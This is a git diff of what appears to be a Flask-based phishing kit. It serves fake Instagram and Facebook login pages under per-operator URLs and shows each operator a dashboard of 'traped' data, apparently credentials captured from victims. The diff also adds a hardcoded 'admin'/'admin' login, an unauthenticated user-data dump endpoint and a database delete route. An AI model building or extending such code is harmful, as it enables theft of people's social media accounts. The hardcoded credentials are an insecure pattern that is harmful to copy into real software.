@@ -1,4 +1,5 @@
 
+from urllib.parse import uses_relative
 from flask import Flask,render_template,request,redirect,url_for,session
 import DBHelper as dbh
 
@@ -36,11 +37,6 @@ def register():
         return render_template("register.html")
 
 
-@app.route("/showUser")
-def showUser():
-    dbh.showUserData()
-    dbh.showTrapedData()
-    return "show User"
 
 
 #90% done just session needs little modification
@@ -53,26 +49,41 @@ def login():
             session['user']=username
             global Suser
             Suser=username
+            print(username,"logged in")
             return redirect('/')
+        #for ADMIN
+        elif username=='admin' and password=='admin':
+            session['user']="admin"
+            Suser=username
+            print(username,"logged in")
+            return redirect('/admin')
         else:
             return render_template("login.html",wrongDetail=True)
     return render_template("login.html")
 
 
-@app.route('/dashboard')
-def dashboard():
-    if 'user' in session and session['user']==Suser:
-        return render_template("dashboard.html",data=dbh.getTrapedDataForOwner(Suser))
-        
-    return '<h1>You are not logged in</h1>'
 
-
-
-
+#completed
 @app.route('/logout')
 def logout():
     session.pop('user')
     return redirect('/')
+
+
+#Completed
+@app.route("/apps")
+def apps():
+    if 'user' in session and session['user']==Suser:
+        return render_template("/apps.html",isLogged=True,uid=Suser)
+    return render_template("login.html",isLogged=False)
+
+
+#needs more modification
+@app.route('/dashboard')
+def dashboard():
+    if 'user' in session and session['user']==Suser:
+        return render_template("dashboard.html",data=dbh.getTrapedDataForOwner(Suser),isLogged=True,uid=Suser)
+    return render_template("login.html",isLogged=False)
 
 
 
@@ -84,19 +95,6 @@ def page_not_found(error):
 
 
 
-@app.route("/apps")
-def apps():
-    if 'user' in session and session['user']==Suser:
-        return render_template("/apps.html",isLogged=True,uid=Suser)
-    return render_template("login.html",isLogged=False)
-
-
-
-#completed
-@app.route("/instagram.com")
-def insta():
-    return render_template("/instagram/insta.html")
-
 
 #completed
 @app.route("/<userid>/instagram.com")
@@ -104,7 +102,6 @@ def phishingPage(userid):
     if dbh.checkIfUserExists(userid):
         return render_template("instagram/insta.html",uid=userid)
     return render_template('page_not_found.html')
-
 
 
 
@@ -125,6 +122,40 @@ def loginInsta():
 
 
 
+
+
+
+
+
+#ADMIN PAGE
+@app.route("/admin")
+def admin():
+     if 'user' in session and session['user']==Suser:
+        return render_template("admin.html",isLogged=True,uid=Suser)
+     return render_template("login.html",isLogged=False)
+
+
+
+
+
+
+#admin not needed now
+@app.route("/instagram.com")
+def insta():
+    return render_template("/instagram/insta.html")
+@app.route("/facebook.com")
+def facebook():
+    return render_template("/facebook/facebook.html")
+
+#for admin
+@app.route("/showUser")
+def showUser():
+    dbh.showUserData()
+    dbh.showTrapedData()
+    return "show User"
+
+
+#for admin
 @app.route("/delete")
 def deleteDATABASE():
     dbh.showTrapedData()
